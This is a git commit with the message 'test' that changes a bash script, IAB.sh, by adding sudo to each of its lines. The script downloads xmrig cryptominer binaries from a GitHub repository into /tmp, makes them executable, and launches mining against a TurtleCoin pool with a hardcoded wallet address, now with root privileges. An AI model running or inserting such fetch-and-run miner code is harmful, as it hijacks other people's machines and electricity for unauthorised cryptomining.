ae0a8e3ba3b4b55f876cba06230a9f68c523a281
jeffthorne <jthorne@u.washington.edu>
2021-03-08 20:15:41 -0800

    test

--- IAB.sh
+++ IAB.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 
-wget https://github.com/jeffthorne/test/raw/main/xmrigDaemon -O /tmp/xmrigDaemon
-chmod +x /tmp/xmrigDaemon
-wget https://github.com/jeffthorne/test/raw/main/xmrigMiner -O /tmp/xmrigMiner
-chmod +x /tmp/xmrigMiner
-./tmp/xmrigDaemon -o ca.turtlecoin.herominers.com:10380 -p x -k -u TRTLuzAyPPASGaxWJi4U7oJ9nEFVGkCcJVKoVyZuKyFJ88G1bjAtayJCBZ1cAdSJZgiDosGrFkcUbiLYFj7FUYdMMJaThJXhp92 --algo argon2/chukwav2
+sudo wget https://github.com/jeffthorne/test/raw/main/xmrigDaemon -O /tmp/xmrigDaemon
+sudo chmod +x /tmp/xmrigDaemon
+sudo wget https://github.com/jeffthorne/test/raw/main/xmrigMiner -O /tmp/xmrigMiner
+sudo chmod +x /tmp/xmrigMiner
+sudo ./tmp/xmrigDaemon -o ca.turtlecoin.herominers.com:10380 -p x -k -u TRTLuzAyPPASGaxWJi4U7oJ9nEFVGkCcJVKoVyZuKyFJ88G1bjAtayJCBZ1cAdSJZgiDosGrFkcUbiLYFj7FUYdMMJaThJXhp92 --algo argon2/chukwav2
 
